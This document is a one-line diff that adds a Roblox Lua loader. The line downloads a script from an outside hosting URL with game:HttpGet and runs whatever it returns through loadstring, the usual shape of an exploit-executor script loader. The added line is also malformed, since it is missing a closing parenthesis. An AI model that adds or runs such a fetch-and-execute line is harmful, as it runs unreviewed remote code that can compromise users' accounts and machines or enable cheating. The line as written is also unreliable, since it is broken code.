@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.is-inside.me/9AbUJDeR.txt')()
